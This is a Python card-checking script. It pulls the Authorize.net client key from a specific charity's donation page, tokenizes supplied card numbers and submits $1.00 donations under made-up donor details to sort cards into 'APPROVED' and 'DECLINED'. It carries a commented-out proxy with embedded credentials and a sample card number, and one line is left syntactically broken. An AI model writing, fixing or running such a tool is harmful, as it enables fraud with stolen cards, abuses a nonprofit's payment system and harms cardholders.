from retry import retry
from dataclasses import dataclass
from requests import Session

def CutQuery(text,Luno,Ldos): return (text.split(Luno))[1].split(Ldos)[0]


@dataclass
class Authorizen1:
    @retry(tries=3)
    def main(self,cards):
       # try:
            self.ccs = cards.split('|')
            self.session = Session()
            
        #    self.session.proxies.update({'http': 'http://97758037913464da:RNW78Fm5@res.proxy-seller.com:10000','https': 'http://97758037913464da:RNW78Fm5@res.proxy-seller.com:10000'})

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
            req1 = self.session.get('https://todaywillbegreat.org/donate/', headers=headers)
            
            clientKey = CutQuery(req1.text,'authData.clientKey = "','"')
            apiLoginID = CutQuery(req1.text,'authData.apiLoginID = "','"')

            headers = {'Content-Type': 'application/json; charset=UTF-8','Origin': 'https://todaywillbegreat.org','Referer': 'https://todaywillbegreat.org/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
            json_data = {
                    'securePaymentContainerRequest': {
                        'merchantAuthentication': {
                            'name': apiLoginID,
                            'clientKey': clientKey,
                        },
                        'data': {
                            'type': 'TOKEN',
                            'id': 'ac37de01-5b7a-1b34-190a-66f909ecdba6',
                            'token': {
                                'cardNumber': self.ccs[0],
                                'expirationDate': '{}{}'.format(self.ccs[1],self.ccs[2]),
                                'cardCode': self.ccs[3],
                            },
                        },
                    },
                }

            req2 = self.session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
            opaqueData = CutQuery(req2.text,'"dataValue":"','"')
            
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://todaywillbegreat.org','referer': 'https://todaywillbegreat.org/donate/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
            params = {'payment-mode': 'authorize','form-id': '397'}

            data = {
                'give-honeypot': '',
                'give-form-id-prefix': '397-1',
                'give-form-id': '397',
                'give-form-title': 'Donate',
                'give-current-url': 'https://todaywillbegreat.org/donate/',
                'give-form-url': 'https://todaywillbegreat.org/donate/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': '5608c23dc0',
                'give-price-id': 'custom',
                'give-amount': '1.00',
                'payment-mode': 'authorize',
                'give_first': 'Lucas',
                'give_last': 'Lorenzo',
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': 'valerie.jenkins@gmail.com',
                'give-form-user-register-hash': '19c8bd3924',
                'give-purchase-var': 'needs-to-register',
                'card_number': ,
                'card_cvc': '000',
                'card_name': '0000000000000000',
                'card_exp_month': '00',
                'card_exp_year': '00',
                'card_expiry': '00 / 00',
                'billing_country': 'US',
                'card_address': 'E Little York Rd 7912',
                'card_address_2': '',
                'card_city': 'Norman',
                'card_state': 'CA',
                'card_zip': '10010',
                'give_authorize_data_descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
                'give_authorize_data_value': opaqueData,
                'give_action': 'purchase',
                'give-gateway': 'authorize',
            }

            response = self.session.post('https://todaywillbegreat.org/donate/', params=params,headers=headers, data=data)
            print(response.text)
            code = CutQuery(response.text, ': [Authorize.net] ', '</p>')

            msg = "APPROVED ✅" if "donation receipt." in code else "DECLINED ❌"
            respuesta = "Charged $1.00 " if msg == "APPROVED ✅" else code

            return  msg,respuesta
                
       # except: return 'DECLINED ❌' ,'This transaction has been declined (tries).'



if __name__ == "__main__":
    cc = '4782002076830811|12|2029|392'
    auth = Authorizen1()
    print(auth.main(cc))
